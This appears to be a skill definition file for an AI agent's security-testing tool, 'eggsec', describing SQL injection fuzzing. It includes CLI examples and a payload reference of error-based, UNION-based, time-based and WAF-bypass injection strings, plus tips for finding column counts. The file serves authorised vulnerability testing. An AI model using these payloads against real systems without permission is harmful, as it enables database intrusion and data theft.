---
name: sql_injection_fuzzing
description: "SQL injection vulnerability detection through fuzzing and payload testing"
triggers:
  - sqli
  - sql injection
  - database
  - or 1=1
  - union select
  - error-based
  - blind sqli
  - time-based
  - boolean-based
  - payload
metadata:
  category: fuzzing
  tools: [fuzzer]
  scope: targets
---

## Overview

SQL injection testing discovers vulnerabilities where user input is incorporated into SQL queries without proper sanitization. Eggsec tests for error-based, UNION-based, blind boolean, and time-based SQL injection.

## Capabilities

- Error-based SQL injection detection
- UNION SELECT payload testing
- Boolean-based blind injection testing
- Time-based (sleep) injection testing
- Stacked queries testing
- WAF bypass payloads
- Parameter tampering (POST, GET, headers)
- Multi-stage injection detection

## Usage

### Basic SQLi Test

```bash
eggsec fuzz --target https://example.com/api/user?id=1 --type sqli
```

### Test All Parameters

```bash
eggsec fuzz --target https://example.com/search --type sqli --all-params
```

### With Custom Payloads

```bash
eggsec fuzz --target https://example.com/api --type sqli --payloads /path/to/payloads.txt
```

### Blind Boolean Testing

```bash
eggsec fuzz --target https://example.com/profile?id=1 --type sqli --blind
```

## Payloads Reference

**Error-Based:**
```sql
' OR '1'='1
" OR "1"="1
' OR 1=1--
admin'--
' UNION SELECT NULL--
```

**Union-Based:**
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION ALL SELECT NULL--
```

**Time-Based:**
```sql
' AND SLEEP(5)--
' AND (SELECT * FROM (SELECT SLEEP(5))a)--
```

**Bypass:**
```sql
admin'--
' OR '1'='1' --
' OR '1'='1' /*
// comments for WAF bypass
```

## Triggers

Keywords: sqli, sql, injection, database, union, select, error, blind, boolean, time-based, sleep, wait, or 1=1, admin', payload, fuzz, test

## Best Practices

1. Always detect WAF before testing (use `eggsec waf detect`)
2. Start with single quotes to trigger error messages
3. Use UNION SELECT with NULL to find column count
4. For blind injection, use boolean logic (1=1 vs 1=2)
5. Time-based tests should have reasonable delays (5-10s)

## Configuration

```toml
[fuzz]
sqli_timeout = 30
sqli_retries = 3
blind_threshold = 5
```